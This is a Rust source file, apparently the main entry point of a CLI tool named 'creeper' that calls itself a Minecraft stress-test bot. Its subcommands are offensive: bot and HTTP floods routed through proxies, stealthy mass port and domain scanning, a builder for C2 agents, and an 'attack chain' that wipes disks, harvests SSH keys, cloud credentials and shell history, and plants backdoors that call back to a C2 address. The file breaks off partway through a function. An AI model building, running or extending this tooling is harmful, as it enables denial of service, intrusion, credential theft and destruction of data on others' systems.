use std::path::PathBuf;
use std::time::Duration;

use clap::{Parser, Subcommand};
use config::Config;
use crate::attack::Creeper;

mod attack;
mod attack_chain;
mod backup;
mod bot;
mod bot_connect;
mod c2build;
mod c2core;
mod config;
mod crawl;
mod discover;
mod host;
mod hids;
mod tasks;
mod entity_location;
mod factory;
#[cfg(feature = "gui")]
mod gui;
mod http_flood;
mod logging;
mod motd;
mod options;
mod protocol;
mod real_session;
mod scanner;
mod service;
mod sync;
mod tui;

#[derive(Parser)]
#[command(name = "creeper", version, about = "Minecraft stress-test bot")]
struct Cli {
    /// Path to config file
    #[arg(short = 'C', long)]
    config: Option<PathBuf>,

    #[command(subcommand)]
    command: Option<Commands>,
}

#[derive(Subcommand)]
enum Commands {
    /// Minecraft stress-test bot（压测 MC 服务器，对外攻击性）
    #[command(visible_alias = "mcs")]
    McStress {
        /// Server hostname
        #[arg(short, long)]
        host: Option<String>,

        /// Server port
        #[arg(short, long)]
        port: Option<u16>,

        /// Number of bots
        #[arg(short = 'c', long = "count")]
        amount: Option<usize>,

        /// Join delay (ms)
        #[arg(short = 'd', long = "delay")]
        delay: Option<u64>,

        /// Bot name format (Java %d syntax)
        #[arg(short = 'n', long = "name")]
        name_format: Option<String>,

        /// Minecraft version
        #[arg(short = 'v', long = "version")]
        version: Option<String>,

        /// Auto-register on join
        #[arg(short = 'r', long = "register")]
        auto_register: bool,

        /// Proxy list file (SOCKS5, one per line)
        #[arg(short = 'P', long = "proxies")]
        proxies: Option<String>,

        /// Nickname list file (one per line)
        #[arg(short = 'N', long = "nicks")]
        nicks: Option<String>,
    },

    /// Print or generate default config, or set values like the hub URL.
    #[command(visible_alias = "c")]
    Config {
        /// Print current config (shorthand for `creeper config show`)
        #[arg(long)]
        show: bool,

        /// Print default config template (shorthand for `creeper config default`)
        #[arg(long)]
        default: bool,

        /// Open config file in $EDITOR (shorthand for `creeper config edit`)
        #[arg(long)]
        edit: bool,

        #[command(subcommand)]
        action: Option<ConfigAction>,
    },

    /// 单次探一个 Minecraft 服务器的 MOTD / 玩家 / 版本
    #[command(visible_alias = "mci")]
    McInfo {
        /// Server hostname
        host: Option<String>,

        /// Server port
        #[arg(short, long, default_value_t = 25565)]
        port: u16,
    },

    /// 循环探 Minecraft 服务器在线状态 + 玩家名册，sync 到 hub。
    /// 用 --targets 从 JSON 文件监控多服。
    #[command(visible_alias = "mcm")]
    McMonitor {
        /// Server hostname (single target mode)
        host: Option<String>,

        /// Server port (single target mode)
        #[arg(short, long, default_value_t = 25565)]
        port: u16,

        /// Ping interval in seconds (single target mode)
        #[arg(short = 't', long, default_value_t = 60)]
        interval: u64,

        /// Hub URL to sync journal to (e.g. http://printer:9090).
        /// Falls back to `hub.default_node` in config, then http://127.0.0.1:9090.
        #[arg(long)]
        hub: Option<String>,

        /// Path to targets JSON file for multi-target monitoring
        #[arg(long)]
        targets: Option<String>,
    },

    /// 扫域名模式 + 端口段找 Minecraft 服务器
    /// Example: creeper mc-discover --domains "srv{}.example.com:1..50" --ports "25565,10000-10500"
    #[command(visible_alias = "mcd")]
    McDiscover {
        /// Domain patterns: "template:start..end", repeatable.
        /// e.g. --domains "srv{}.example.com:1..50"
        #[arg(short = 'D', long, required = true)]
        domains: Vec<String>,

        /// Ports to scan: comma-separated with ranges.
        /// e.g. --ports "25565,10000-10500,25000-26500"
        #[arg(short = 'p', long, default_value = "25565,10000-10500,25000-26500")]
        ports: String,

        /// Max concurrent probes
        #[arg(short = 'c', long, default_value_t = 50)]
        concurrency: usize,

        /// Output as JSON array (for targets-template.json)
        #[arg(long)]
        json: bool,
    },

    /// HTTP/HTTPS flood（并发请求 flooding，对外攻击性）
    #[command(visible_alias = "hf")]
    HttpFlood {
        /// Target URL
        url: String,

        /// HTTP method (GET, POST, PUT, DELETE, PATCH, HEAD, OPTIONS)
        #[arg(short, long, default_value = "GET")]
        method: String,

        /// Number of concurrent connections
        #[arg(short = 'c', long, default_value_t = 50)]
        concurrency: usize,

        /// Total requests (0 = unlimited until Ctrl+C)
        #[arg(short = 'n', long, default_value_t = 0)]
        total: u64,

        /// Request body (for POST/PUT/PATCH)
        #[arg(short = 'b', long)]
        body: Option<String>,

        /// Delay between requests in ms
        #[arg(short = 'd', long, default_value_t = 0)]
        delay: u64,

        /// Custom header, can be repeated: -H "Key: Value"
        #[arg(short = 'H', long)]
        header: Vec<String>,

        /// Proxy URL (socks5://... or http://...), can be repeated
        #[arg(short = 'P', long)]
        proxy: Vec<String>,

        /// Request timeout in seconds
        #[arg(short = 't', long, default_value_t = 30)]
        timeout: u64,
    },

    /// 查域名是否在 CDN（Cloudflare 等）后
    #[command(visible_alias = "ck")]
    CdnCheck {
        /// Domain name to check
        domain: String,
    },

    /// 查 Creeper Hub 节点状态 + 环家名册（合并旧 hub + status）
    ///   `creeper hub-query`                 → 节点元信息（health/uptime/target/total players）
    ///   `creeper hub-query --scope players`  → 完整玩家名册（per-server names + roles）
    ///   `creeper hub-query --scope servers`  → per-server overview
    ///   `creeper hub-query --scope all`      → merged JSON: node meta + servers + players
    ///   `creeper hub-query --scope hosts`    → 本机资源探针聚合（host-monitor 上报）
    #[command(visible_alias = "hq")]
    HubQuery {
        /// Hub URL (e.g. http://localhost:9090). Optional: falls back to `hub.default_node` in config,
        /// then http://127.0.0.1:9090. Auto-prepends `http://` if no scheme.
        url: Option<String>,

        /// What to fetch: `players`, `servers`, `all`, `hosts`. Omit for node meta only.
        #[arg(short = 's', long)]
        scope: Option<StatusScope>,

        /// Override the hub URL (same as the positional `url`).
        #[arg(long)]
        hub: Option<String>,
    },

    /// 提交扫描任务到 Hub 分发给 worker
    #[command(visible_alias = "hsub")]
    HubSubmit {
        /// Hub URL to submit to (e.g. http://printer:9090)
        #[arg(long)]
        hub: Option<String>,

        /// Domain names to scan (comma-separated)
        domains: Vec<String>,

        /// Port ranges: comma-separated ranges like "25565,10000-10500"
        #[arg(long, default_value = "25565,10000-10500")]
        ports: String,

        /// Concurrent probes per host
        #[arg(short = 'c', long, default_value_t = 5)]
        concurrency: usize,
    },

    /// Worker 模式：从 Hub poll 任务并执行
    #[command(visible_alias = "hw")]
    HubWorker {
        /// Hub URL to pull tasks from (e.g. http://printer:9090)
        #[arg(long)]
        hub: Option<String>,

        /// Worker ID for logging
        #[arg(long)]
        worker_id: Option<String>,

        /// Poll interval in seconds (default: 60)
        #[arg(long, default_value_t = 60)]
        poll_interval: u64,
    },

    /// 列 Hub 上的所有任务
    #[command(visible_alias = "ht")]
    HubTasks {
        /// Hub URL (e.g. http://printer:9090)
        #[arg(long)]
        hub: Option<String>,
    },

    /// Terminal UI dashboard（MC 监控 + flood 控制）
    #[command(visible_alias = "t")]
    Tui {
        /// Server hostname to monitor
        host: Option<String>,

        /// Server port
        #[arg(short, long, default_value_t = 25565)]
        port: u16,

        /// Hub URL to pull journal from (e.g. http://printer:9090).
        /// Falls back to `hub.default_node` in config, then http://127.0.0.1:9090.
        #[arg(long)]
        hub: Option<String>,
    },

    /// 装/启/停/查 systemd 服务
    #[command(visible_alias = "sv")]
    Service {
        #[command(subcommand)]
        action: ServiceAction,
    },

    /// 启 Hub 服务端 — 给其他节点 sync 用
    #[command(visible_alias = "hs")]
    HubServe {
        /// Listen host
        #[arg(long, default_value = "0.0.0.0")]
        host: String,

        /// Listen port
        #[arg(long, default_value_t = 9090)]
        port: u16,

        /// Display name for the target being monitored
        #[arg(long, default_value = "unknown")]
        target: String,
    },

    /// 看 Minecraft 环家名册（本地或从 hub 拉）
    #[command(visible_alias = "mcj")]
    McJournal {
        /// Server hostname filter
        host: Option<String>,

        /// Server port
        #[arg(short, long, default_value_t = 25565)]
        port: u16,

        /// Hub URL to pull from (e.g. http://printer:9090).
        /// Falls back to `hub.default_node` in config, then http://127.0.0.1:9090.
        #[arg(long)]
        hub: Option<String>,
    },

    /// 给 Minecraft 环家打标�注（role / note）
    #[command(visible_alias = "mca")]
    McAnnotate {
        /// Server hostname
        host: Option<String>,

        /// Server port
        #[arg(short, long, default_value_t = 25565)]
        port: u16,

        /// Player name
        player: String,

        /// Role: 服主 / 管理员 / 普通玩家 / 未知
        #[arg(long, default_value = "")]
        role: String,

        /// Free-text note
        #[arg(long, default_value = "")]
        note: String,
    },

    /// 构建 C2 agent 二进制（教育用途）
    #[command(visible_alias = "cb")]
    C2Build {
        /// C2 server address(es) to hardcode into the agent
        #[arg(short = 'S', long = "server", required = true)]
        servers: Vec<String>,
    },

    /// 慢速长跑扫 pending_scan 域名（长期探索，低并发）
    /// Designed for Arch node — low concurrency, long delays between rounds
    #[command(visible_alias = "mcc")]
    McCrawl {
        /// Path to targets-template.json (default: ./data/targets-template.json)
        #[arg(long)]
        targets: Option<String>,

        /// Port ranges to scan: comma-separated ranges like "25565,10000-10500"
        #[arg(long, default_value = "25565,10000-10500,25000-26000,21000-23000")]
        ports: String,

        /// Concurrent probes per host (default: 5 — slow for stealth)
        #[arg(short = 'c', long, default_value_t = 5)]
        concurrency: usize,

        /// Delay between scan rounds in seconds (default: 300 = 5 minutes)
        #[arg(long, default_value_t = 300)]
        round_delay: u64,

        /// Delay between port chunks in milliseconds (default: 5000)
        #[arg(long, default_value_t = 5000)]
        port_delay_ms: u64,
    },

    /// IPv4 范围 + 端口扫描，带协议检测（nmap 式）
    #[command(visible_alias = "ps")]
    PortScan {
        /// Target IP(s): single (1.1.1.1), CIDR (1.1.1.0/24), or range (1.1.1.1~1.1.1.254)
        #[arg(short = 'T', long, required = true)]
        target: Vec<String>,

        /// Port(s): single (80), range (10000~50000), comma-separated
        #[arg(short, long, default_value = "22,80,443,3389,8080")]
        ports: String,

        /// Scan modes: tcp, udp, http, icmp, rdp, ssh (comma-separated)
        #[arg(short = 'm', long, default_value = "tcp")]
        modes: String,

        /// Concurrent tasks (default: 50)
        #[arg(short = 'c', long, default_value_t = 50)]
        concurrency: usize,
    },

    /// 单次探本机系统信息：OS / admin / 可用 shell
    #[command(visible_alias = "hi")]
    HostInfo,

    /// 循环探本机资源（CPU/RAM/磁盘/在线/负载/网络），POST 到 hub `/host-report`。
    /// 这才是"探针"角色 —— 监控这台 Linux 是否在线 + 资源占用，不探 MC server。
    #[command(visible_alias = "hm")]
    HostMonitor {
        /// Hub URL to sync host reports to.
        /// Falls back to `hub.default_node` in config, then http://127.0.0.1:9090.
        #[arg(long)]
        hub: Option<String>,

        /// Poll interval in seconds (default: 60)
        #[arg(long, default_value_t = 60)]
        interval: u64,
    },

    /// 数据备份打包 .zip（本地或从 Hub 远程拉取）
    #[command(visible_alias = "b")]
    Backup {
        /// Remote Hub URL to pull data from (e.g. http://printer:9090).
        /// Omit for local backup of this machine's data directory.
        #[arg(short, long)]
        remote: Option<String>,

        /// Output directory for the backup .zip (default: data_dir/backups/)
        #[arg(short, long)]
        output: Option<String>,
    },

    /// 攻击链模块 1：自毁/抹盘（wipe）——危险操作，默认 dry-run 仅打印不执行。
    ///
    /// 目标平台：Linux（dd/shred/rm -rf）或 Windows（diskpart/Clear-Disk/rd）。
    /// 需要 `--execute` 标志并确认后才能实际执行。
    ///
    /// 示例：
    ///   creeper wipe --platform linux --level mbr              # dry-run 打印计划
    ///   creeper wipe --platform linux --level full --execute   # 实际执行完整抹盘
    ///   creeper wipe --platform windows --level shred -x -y    # 静默执行（不确认）
    #[command(visible_alias = "w")]
    Wipe {
        /// 目标平台: linux, windows, auto（自动检测）
        #[arg(short, long, default_value = "auto")]
        platform: String,

        /// 实际执行（默认 dry-run 只打印不执行）
        #[arg(short = 'x', long)]
        execute: bool,

        /// 跳过确认提示（静默模式，仅与 --execute 联用）
        #[arg(short = 'y', long)]
        yes: bool,

        /// 抹盘级别: mbr（清分区表）, shred（覆写）, full（完整破坏）
        #[arg(short = 'l', long, default_value = "mbr")]
        level: String,
    },

    /// 攻击链模块 2：敏感文件/凭据回收（harvest）——只读收集，无破坏性。
    ///
    /// 收集 SSH 密钥、云凭据（AWS/GCloud/Azure/Docker/K8s）、
    /// shell 历史、系统配置等敏感文件。
    ///
    /// 示例：
    ///   creeper harvest --platform linux                      # 打印到 stdout
    ///   creeper harvest --platform linux --output ./report    # 保存到目录
    ///   creeper harvest --platform windows --output ./dump.zip --zip  # 打包 zip
    #[command(visible_alias = "h")]
    Harvest {
        /// 目标平台: linux, windows, auto（自动检测）
        #[arg(short, long, default_value = "auto")]
        platform: String,

        /// 输出目录或文件路径（默认打印到 stdout）
        #[arg(short = 'o', long)]
        output: Option<String>,

        /// 打包为 zip（含 JSON 报告 + 收集到的文件）
        #[arg(short = 'z', long)]
        zip: bool,
    },

    /// 攻击链模块 3：投放持久化后门（persist）——默认 dry-run。
    ///
    /// 支持 Linux（SSH key / crontab / systemd / bashrc）和
    /// Windows（SSH key / schtasks / registry Run / Startup）。
    ///
    /// 示例：
    ///   creeper persist --ssh-key "ssh-rsa AAAA..."                               # dry-run
    ///   creeper persist --ssh-key "ssh-rsa AAAA..." --callback "http://c2:8080"   # dry-run
    ///   creeper persist --ssh-key "ssh-rsa AAAA..." --execute                     # 实际执行
    #[command(visible_alias = "p")]
    Persist {
        /// 目标平台: linux, windows, auto（自动检测）
        #[arg(short, long, default_value = "auto")]
        platform: String,

        /// SSH 公钥内容（用于 authorized_keys 后门）
        #[arg(short = 'k', long)]
        ssh_key: Option<String>,

        /// 回调地址（C2 或反弹 shell 地址）
        #[arg(short = 'c', long)]
        callback: Option<String>,

        /// 实际执行（默认 dry-run 只打印不执行）
        #[arg(short = 'x', long)]
        execute: bool,
    },

    /// 主机入侵指标自检（HIDS）——只读安全检查
    ///
    /// 在自己管理的机器上检查以下入侵指标：
    ///   - SSH authorized_keys 异常
    ///   - Shell history 清空/可疑命令
    ///   - Systemd 服务异常 / cron 任务
    ///   - /dev/shm 可执行文件检测
    ///   - 云凭据泄漏检测
    ///   - 启动脚本后门检测
    ///   - 弱口令自检
    #[command(visible_alias = "hids")]
    HidsCheck {
        /// 输出 JSON 格式（便于程序处理）
        #[arg(short, long)]
        json: bool,
    },

    /// egui 仪表盘（桌面/Web GUI）
    ///   编译: cargo run --features gui -- web
    ///   需要挂载一个 Hub URL（默认 http://127.0.0.1:9090）
    #[cfg(feature = "gui")]
    #[command(visible_alias = "w")]
    Web {
        /// Hub URL (e.g. http://printer:9090). Falls back to config.
        #[arg(short, long)]
        hub: Option<String>,
    },
}

#[derive(Subcommand)]
enum ServiceAction {
    /// Install autostart service (systemd / launchd / Windows Service)
    Install,
    /// Uninstall service
    Uninstall,
    /// Start the daemon (forks to background on Unix)
    Start,
    /// Stop the daemon
    Stop,
    /// Show service status
    Status,
    /// Run in foreground (used internally by service manager)
    Run,
}

/// Subcommands of `creeper config`.
#[derive(Subcommand)]
enum ConfigAction {
    /// Print current config to stdout
    Show,
    /// Print the default config template
    Default,
    /// Open the config file in $EDITOR / $VISUAL
    Edit,
    /// Set the hub (central node) URL stored in config, so commands like
    /// `creeper status` / `hub` / `journal` use it without re-typing.
    /// Example: `creeper config set-hub http://<your-hub-ip>:9090`
    /// **Legacy**：仍可用，效果是把默认节点的唯一连接改成此 URL。
    #[command(visible_alias = "sh")]
    SetHub {
        /// Hub URL, e.g. `http://<your-hub-ip>:9090` or just `<your-hub-ip>:9090`
        /// (http:// is auto-prepended if no scheme).
        url: String,
    },
    /// 登记一个新 hub 节点（多节点多连接方式）。
    /// 例：`creeper config add-node --id <sha256|label> --label arch-lab --role scanner --url http://<your-hub>:9090 --kind ipv4`
    #[command(visible_alias = "an")]
    AddNode {
        /// 唯一标识符（sha256 / uuid / 人类可读 label 都行）。
        #[arg(long)]
        id: String,
        /// 人类可读别名。
        #[arg(long, default_value = "")]
        label: String,
        /// 节点角色：probe / scanner / hub。
        #[arg(long, default_value = "")]
        role: String,
        /// 第一个连接方式的 URL。
        #[arg(long)]
        url: String,
        /// 连接类型：ipv4 / ipv6 / nat / forward-http / reverse-http / forward-ws / reverse-ws / forward-tcp / reverse-tcp / tor / i2p / other。
        #[arg(long, default_value = "ipv4")]
        kind: String,
        /// 优先级（小者优先）。
        #[arg(long, default_value_t = 0)]
        priority: i32,
        /// 备注。
        #[arg(long, default_value = "")]
        note: String,
        /// 登记后是否设为默认节点。
        #[arg(long)]
        default: bool,
    },
    /// 给已登记的 hub 节点追加一个连接方式。
    /// 例：`creeper config add-conn --node arch-lab --kind nat --url http://<your-nat-host>:<nat-port> --priority 5`
    #[command(visible_alias = "ac")]
    AddConn {
        /// 目标节点的 id 或 label。
        #[arg(long)]
        node: String,
        /// 连接类型。
        #[arg(long, default_value = "ipv4")]
        kind: String,
        /// 连接 URL。
        #[arg(long)]
        url: String,
        /// 优先级。
        #[arg(long, default_value_t = 0)]
        priority: i32,
        /// 备注。
        #[arg(long, default_value = "")]
        note: String,
    },
    /// 列出已登记的所有 hub 节点与其连接方式。
    #[command(visible_alias = "ln")]
    ListNodes,
}

/// Scope argument for `creeper status` — controls which hub endpoint(s) to fetch.
#[derive(Debug, Clone, clap::ValueEnum)]
enum StatusScope {
    /// Full player journal: per-server player names + roles + notes + timestamps
    Players,
    /// Per-server overview: server → player count + name list
    Servers,
    /// Merged JSON: node meta (from /status) + servers + players (from /journal)
    All,
    /// Host probes aggregated (from /host-report) — RAM/CPU/disk/uptime/load/nets
    Hosts,
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    logging::init();
    let cli = Cli::parse();

    match cli.command {
        Some(Commands::Config { show, default: print_def, edit, action }) => {
            // Subcommand path (creeper config show / edit / default / set-hub)
            if let Some(act) = action {
                match act {
                    ConfigAction::Show => {
                        let path = cli.config.clone().unwrap_or_else(|| Config::path().unwrap_or_default());
                        let cfg = Config::load_from(Some(&path)).unwrap_or_default();
                        println!("{}", serde_json::to_string_pretty(&cfg).unwrap());
                        return Ok(());
                    }
                    ConfigAction::Default => {
                        config::print_default();
                        return Ok(());
                    }
                    ConfigAction::Edit => {
                        let path = cli.config.clone().unwrap_or_else(|| Config::path().unwrap_or_default());
                        let p = if path.exists() { path } else {
                            let cfg = Config::default();
                            cfg.save_to(&path)?;
                            path
                        };
                        let editor = std::env::var("EDITOR")
                            .or_else(|_| std::env::var("VISUAL"))
                            .unwrap_or_else(|_| "vim".into());
                        let status = std::process::Command::new(&editor).arg(&p).status()?;
                        if !status.success() {
                            anyhow::bail!("Editor exited with error");
                        }
                        let cfg = Config::load_from(Some(&p))?;
                        cfg.save_to(&p)?;
                        log::info!("Config saved to {}", p.display());
                        return Ok(());
                    }
                    ConfigAction::SetHub { url } => {
                        let path = cli.config.clone().unwrap_or_else(|| Config::path().unwrap_or_default());
                        // Normalize URL: auto-prepend http:// if no scheme, trim trailing /
                        let normalized = if url.contains("://") {
                            url.trim_end_matches('/').to_string()
                        } else {
                            format!("http://{}", url.trim_end_matches('/'))
                        };
                        // Load existing config (or default), update default node, save
                        let mut cfg = if path.exists() {
                            Config::load_from(Some(&path)).unwrap_or_default()
                        } else {
                            Config::default()
                        };
                        // 写入默认节点 default 的唯一 ipv4 连接（兼容旧用法）
                        let node_id = if cfg.hub.default_node.is_empty() { "default" } else { &cfg.hub.default_node };
                        if let Some(node) = cfg.hub.nodes.iter_mut().find(|n| n.id == node_id) {
                            // 已有节点：替换其 connections 为单连接
                            node.connections = vec![config::HubConnection {
                                kind: "ipv4".into(),
                                url: normalized.clone(),
                                priority: 0,
                                enabled: true,
                                note: String::new(),
                            }];
                        } else {
                            // 新建默认节点
                            cfg.hub.nodes.push(config::HubNode {
                                id: node_id.to_string(),
                                label: String::new(),
                                role: String::new(),
                                connections: vec![config::HubConnection {
                                    kind: "ipv4".into(),
                                    url: normalized.clone(),
                                    priority: 0,
                                    enabled: true,
                                    note: String::new(),
                                }],
                            });
                            if cfg.hub.default_node.is_empty() {
                                cfg.hub.default_node = "default".into();
                            }
                        }
                        cfg.save_to(&path)?;
                        println!("✓ Default hub connection set to {}", normalized);
                        println!("  Saved to {}", path.display());
                        println!();
                        println!("  Now `creeper status`, `creeper hub`, `creeper journal`, `creeper tui`");
                        println!("  will automatically use this hub. No need to pass --hub each time.");
                        println!();
                        println!("  Tip: 用 `creeper config add-node` / `add-conn` 登记多节点多连接方式。");
                        return Ok(());
                    }
                    ConfigAction::AddNode { id, label, role, url, kind, priority, note, default } => {
                        let path = cli.config.clone().unwrap_or_else(|| Config::path().unwrap_or_default());
                        let mut cfg = if path.exists() {
                            Config::load_from(Some(&path)).unwrap_or_default()
                        } else {
                            Config::default()
                        };
                        let normalized = if url.contains("://") {
                            url.trim_end_matches('/').to_string()
                        } else {
                            format!("http://{}", url.trim_end_matches('/'))
                        };
                        if cfg.hub.nodes.iter().any(|n| n.id == id) {
                            anyhow::bail!("Node id '{}' already exists. 用 `add-conn` 给它追加连接方式，或换 id。", id);
                        }
                        cfg.hub.nodes.push(config::HubNode {
                            id: id.clone(),
                            label: label.clone(),
                            role: role.clone(),
                            connections: vec![config::HubConnection {
                                kind: kind.clone(),
                                url: normalized.clone(),
                                priority,
                                enabled: true,
                                note: note.clone(),
                            }],
                        });
                        if default || cfg.hub.default_node.is_empty() {
                            cfg.hub.default_node = id.clone();
                        }
                        cfg.save_to(&path)?;
                        let tag = if default { " [default]" } else { "" };
                        println!("✓ Node '{}' added (role={}, {} connection: {} {})", id, role, kind, normalized, tag);
                        println!("  Saved to {}", path.display());
                        return Ok(());
                    }
                    ConfigAction::AddConn { node, kind, url, priority, note } => {
                        let path = cli.config.clone().unwrap_or_else(|| Config::path().unwrap_or_default());
                        let mut cfg = if path.exists() {
                            Config::load_from(Some(&path)).unwrap_or_default()
                        } else {
                            Config::default()
                        };
                        let normalized = if url.contains("://") {
                            url.trim_end_matches('/').to_string()
                        } else {
                            format!("http://{}", url.trim_end_matches('/'))
                        };
                        match cfg.hub.nodes.iter_mut().find(|n| n.id == node || n.label == node) {
                            Some(n) => {
                                n.connections.push(config::HubConnection {
                                    kind: kind.clone(),
                                    url: normalized.clone(),
                                    priority,
                                    enabled: true,
                                    note: note.clone(),
                                });
                                n.connections.sort_by_key(|c| c.priority);
                            }
                            None => anyhow::bail!("Node '{}' not found. 先用 `add-node` 登记。", node),
                        }
                        cfg.save_to(&path)?;
                        println!("✓ Connection '{}' ({}) added to node '{}'", normalized, kind, node);
                        println!("  Saved to {}", path.display());
                        return Ok(());
                    }
                    ConfigAction::ListNodes => {
                        let path = cli.config.clone().unwrap_or_else(|| Config::path().unwrap_or_default());
                        let cfg = Config::load_from(Some(&path)).unwrap_or_default();
                        if cfg.hub.nodes.is_empty() && cfg.hub.url.is_empty() {
                            println!("(no hub nodes registered)");
                            println!("  用 `creeper config add-node --id <id> --url <url> ...` 登记。");
                            return Ok(());
                        }
                        let dn = if cfg.hub.default_node.is_empty() { "(none)" } else { &cfg.hub.default_node };
                        println!("Default node: {dn}");
                        println!();
                        for n in &cfg.hub.nodes {
                            println!("┌─ Node ─────────────────────────────────────");
                            println!("│ id    : {}", n.id);
                            if !n.label.is_empty() { println!("│ label : {}", n.label); }
                            if !n.role.is_empty() { println!("│ role  : {}", n.role); }
                            if n.connections.is_empty() {
                                println!("│ (no connections)");
                            } else {
                                for (i, c) in n.connections.iter().enumerate() {
                                    let tag = if c.enabled { "ON" } else { "OFF" };
                                    println!("│ [{i}] {tag}  prio={}  {}  {}", c.priority, c.kind, c.url);
                                    if !c.note.is_empty() { println!("│       note: {}", c.note); }
                                }
                            }
                            println!("└──────────────────────────────────────────────");
                        }
                        if !cfg.hub.url.is_empty() && cfg.hub.nodes.is_empty() {
                            println!("[legacy] hub.url = {}（建议用 add-node 迁移到 nodes）", cfg.hub.url);
                        }
                        return Ok(());
                    }
                }
            }

            // Legacy flag path (creeper config --show / --default / --edit)
            if print_def {
                config::print_default();
                return Ok(());
            }
            let path = cli.config.clone().unwrap_or_else(|| Config::path().unwrap_or_default());
            if show {
                let cfg = Config::load_from(Some(&path)).unwrap_or_default();
                println!("{}", serde_json::to_string_pretty(&cfg).unwrap());
                return Ok(());
            }
            if edit {
                let p = if path.exists() { &path } else {
                    let cfg = Config::default();
                    cfg.save_to(&path)?;
                    &path
                };
                let editor = std::env::var("EDITOR")
                    .or_else(|_| std::env::var("VISUAL"))
                    .unwrap_or_else(|_| "vim".into());
                let status = std::process::Command::new(&editor).arg(p).status()?;
                if !status.success() {
                    anyhow::bail!("Editor exited with error");
                }
                let cfg = Config::load_from(Some(p))?;
                cfg.save_to(p)?;
                log::info!("Config saved to {}", p.display());
                return Ok(());
            }
            let p = cli.config.unwrap_or_else(|| Config::path().unwrap_or_default());
            println!("{}", p.display());
        }

        Some(Commands::McStress { host, port, amount, delay, name_format, version,
                                auto_register, proxies, nicks }) => {
            let mut cfg = cli.config.as_deref()
                .and_then(|p| Config::load_from(Some(p)).ok())
                .unwrap_or_default();

            cfg.apply_cli_overrides(host, port, amount, delay, name_format, version, Some(auto_register));

            let proxies_vec: Vec<protocol::ProxyInfo> = if let Some(ref path) = proxies {
                load_proxies_file(path)?
            } else { vec![] };

            let nicks_vec: Vec<String> = if let Some(ref path) = nicks {
                let content = std::fs::read_to_string(path)?;
                content.lines().map(|l| l.trim().to_owned()).filter(|l| !l.is_empty()).collect()
            } else { vec![] };

            run_attack(cfg, proxies_vec, nicks_vec).await;
        }

        Some(Commands::McDiscover { domains, ports, concurrency, json }) => {
            let patterns: Vec<discover::DomainPattern> = domains
                .iter()
                .map(|d| discover::DomainPattern::parse(d))
                .collect::<Result<_, _>>()?;
            let ports = discover::parse_ports(&ports)?;

            log::info!(
                "Discover mode: {} pattern(s), {} port(s), concurrency={}",
                patterns.len(),
                ports.len(),
                concurrency,
            );

            let servers = discover::discover(&patterns, &ports, concurrency).await;

            if json {
                println!("{}", discover::to_targets_json(&servers));
            } else {
                discover::print_results(&servers);
            }
        }

        Some(Commands::McInfo { host, port }) => {
            let host = host.unwrap_or_else(|| "127.0.0.1".to_string());
            log::info!("Querying server info for {}:{} ...", host, port);

            // Try Java first, fallback to Bedrock (UDP/RakNet)
            let result = motd::ping(&host, port, -1, true);

            if result.info.motd.is_empty() {
                log::error!("Server unreachable on both Java (TCP) and Bedrock (UDP).");
                eprintln!("Server is offline or unreachable.");
                return Ok(());
            }

            motd::print_server_info(&result);
        }

        Some(Commands::McMonitor { host, port, interval, hub: hub_cli, targets }) => {
            let cfg = Config::load();
            let hub_url = cfg.resolve_hub_url(hub_cli.as_deref(), None);
            let sync_url = Some(hub_url);

            // Multi-target mode: --targets <file>
            if let Some(ref targets_path) = targets {
                log::info!("Multi-target monitor mode: {}", targets_path);
                motd::monitor_all(targets_path, sync_url.as_deref()).await?;
                return Ok(());
            }

            // Single-target mode
            let host = host.unwrap_or_else(|| "127.0.0.1".to_string());
            let interval = std::time::Duration::from_secs(interval);

            log::info!("Starting monitor for {}:{} (every {}s)", host, port, interval.as_secs());
            if let Some(ref url) = sync_url {
                log::info!("Syncing journal to hub: {}", url);
            }

            // First query — show server info if reachable, otherwise let the loop retry
            let result = motd::ping(&host, port, -1, false);
            if result.info.motd.is_empty() {
                log::warn!("Server {}:{} is currently unreachable — monitor will retry", host, port);
                eprintln!("Server is offline or unreachable. Monitor will retry...");
            } else {
                motd::print_server_info(&result);
            }
            println!();
            log::info!("Monitoring — press Ctrl+C to stop and save journal");

            motd::monitor_sync(&host, port, -1, interval, sync_url.as_deref()).await?;
        }

        Some(Commands::HttpFlood { url, method, concurrency, total, body, delay, header, proxy, timeout }) => {
            let http_method = http_flood::HttpMethod::from_str(&method)
                .ok_or_else(|| anyhow::anyhow!("Invalid HTTP method: {}. Use GET, POST, PUT, DELETE, PATCH, HEAD, or OPTIONS", method))?;

            // Parse custom headers
            let headers: Vec<(String, String)> = header.iter()
                .filter_map(|h| {
                    h.split_once(':')
                        .map(|(k, v)| (k.trim().to_string(), v.trim().to_string()))
                })
                .collect();

            if headers.len() != header.len() {
                log::warn!("Some headers could not be parsed (format: -H 'Key: Value')");
            }

            let cfg = http_flood::HttpFloodConfig {
                url,
                method: http_method,
                concurrency,
                total,
                headers,
                body,
                delay_ms: delay,
                proxies: proxy,
                timeout_secs: timeout,
            };

            let snapshot = http_flood::start_flood(cfg).await;
            match snapshot {
                Ok(s) => http_flood::print_flood_summary(&s),
                Err(e) => log::error!("HTTP flood failed: {e}"),
            }
        }

        Some(Commands::HubSubmit { hub, domains, ports, concurrency }) => {
            let cfg = Config::load();
            let hub_url = cfg.resolve_hub_url(hub.as_deref(), None);

            let mut port_list = Vec::new();
            for part in ports.split(',') {
                let part = part.trim();
                if part.is_empty() { continue; }
                if let Some((lo_str, hi_str)) = part.split_once('-') {
                    let lo: u16 = lo_str.parse().map_err(|e| anyhow::anyhow!("invalid port: {}", e))?;
                    let hi: u16 = hi_str.parse().map_err(|e| anyhow::anyhow!("invalid port: {}", e))?;
                    for p in lo..=hi {
                        port_list.push(p);
                    }
                } else {
                    let p: u16 = part.parse().map_err(|e| anyhow::anyhow!("invalid port: {}", e))?;
                    port_list.push(p);
                }
            }

            let payload = serde_json::json!({
                "domains": domains,
                "ports": port_list,
                "concurrency": concurrency,
            });

            let url = format!("{}/tasks", hub_url.trim_end_matches('/'));
            match reqwest::Client::new()
                .post(&url)
                .json(&payload)
                .timeout(std::time::Duration::from_secs(10))
                .send()
                .await
            {
                Ok(resp) => {
                    let status = resp.status();
                    if status.is_success() {
                        let body = resp.json::<serde_json::Value>().await?;
                        println!("✅ Task submitted to {}:", hub_url);
                        println!("   Task ID: {}", body["task_id"].as_str().unwrap_or("?"));
                        println!("   Status: {}", body["status"].as_str().unwrap_or("?"));
                        println!("   Domains: {}", body["domains"].as_u64().unwrap_or(0));
                        println!("   Ports: {}", body["ports"].as_u64().unwrap_or(0));
                    } else {
                        let body = resp.text().await.unwrap_or_default();
